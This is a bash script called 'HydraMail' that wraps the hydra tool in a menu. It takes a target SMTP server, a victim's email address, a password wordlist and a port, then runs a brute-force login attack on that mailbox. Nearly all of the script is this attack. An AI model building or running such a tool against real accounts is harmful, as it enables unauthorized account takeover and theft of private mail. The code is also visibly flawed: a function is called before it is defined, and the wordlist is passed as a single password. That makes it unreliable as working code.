#!/bin/bash

#============================================#
#              CHECK FOR ROOT                #
#============================================#

clear
splash
if [ "$EUID" -ne 0 ]
  then
  echo "You must run as root!"
  exit
fi

#============================================#
#                 FUNCTIONS                  #
#============================================#

splash(){
	echo -e "\e[32m _   _             _                               _   \e[0m";
	sleep 0.05
	echo -e "\e[32m( ) ( )           ( )            /'\_/\`\        _ (_ ) \e[0m";
	sleep 0.05
	echo -e "\e[32m| |_| | _   _    _| | _ __   _ _ |     |   _ _ (_) | | \e[0m";
	sleep 0.05
	echo -e "\e[32m|  _  |( ) ( ) /'_\` |( '__)/'_\` )| (_) | /'_\` )| | | | \e[0m";
	sleep 0.05
	echo -e "\e[32m| | | || (_) |( (_| || |  ( (_| || | | |( (_| || | | | \e[0m";
	sleep 0.05
	echo -e "\e[32m(_) (_)\`\__, |\`\__,_)(_)  \`\__,_)(_) (_)\`\__,_)(_)(___)\e[0m";
	sleep 0.05
	echo -e "\e[32m       ( )_| |                                         \e[0m";
	sleep 0.05
	echo -e "\e[32m       \`\___/'                                         \e[0m";
	sleep 0.05
	echo " "
}

credits(){
	echo -e " "
	echo -e "Developed by\e[32m Majik Cat Security\e[0m"
	sleep 1.5
	echo -e "Written:\e[32m July of 2019\e[0m"
	sleep 1.5
	echo -e " "
	echo -e "Web URL:\e[34m http://www.majikcat.com\e[0m"
	sleep 1.5
	echo -e "GitHub:\e[34m https://github.com/hwac121\e[0m"
	sleep 1.5
	echo -e "eMail:\e[36m rjl@majikcat.com\e[0m"
	sleep 3.0
	echo -e " "
	clear
}

#============================================#
#                 MAIN MENU                  #
#============================================#

options=("Set options" "Show options" "Attack target" "Credits" "Quit")

PS3=':> '
while [ "$menu" != 1 ]; do
clear
splash
select opt in "${options[@]}" ; do
	case $opt in

	"Set options")
	clear
	splash
	echo -e "Enter target smtp server (ie smtp.mymail.com)"
	read tmserver
	echo -e "Enter target email (ie target@usermail.com)"
	read temail
	echo -e "Set path to wordlist (ie /home/user/wordlists/rockyou.txt)"
	read wordlist
	echo -e "Enter port number to use (ie 465)"
	read tport
	break
	;;

	"Show options")
	clear
	splash
	echo " "
	echo -e "SMTP server is:\e[31m $tmserver\e[0m"
	echo " "
	sleep 0.05
	echo -e "Email login is:\e[34m $temail\e[0m"
	echo " "
	sleep 0.05
	echo -e "You chosen wordlist is:\e[32m $wordlist\e[0m"
	echo " "
	sleep 0.05
	echo -e "Your chosen port is:\e[36m $tport\e[0m"
	sleep 5
	break
	;;

	"Attack target")
	clear
	splash
	echo " "
	echo "Close the popup terminal window to continue..."
	xterm -hold -e hydra $tmserver smtp -l $temail -p $wordlist -s $tport -S -v -V
	break
	;;

	"Credits")
		clear
		splash
		credits
	break
	;;

	"Quit")
		clear
		splash
		echo -e " "
		echo -e "Thanks for using HydraMail by Majik Cat Security - July 2019"
		echo -e "GitHub: https://github.com/hwac121"
		sleep 3
		clear
		menu=1
	break
	;;
			*)
				clear
				splash
				echo -e "invalid option $REPLY"
				sleep 3
                break
                ;;
                esac
        done
done

exit 0

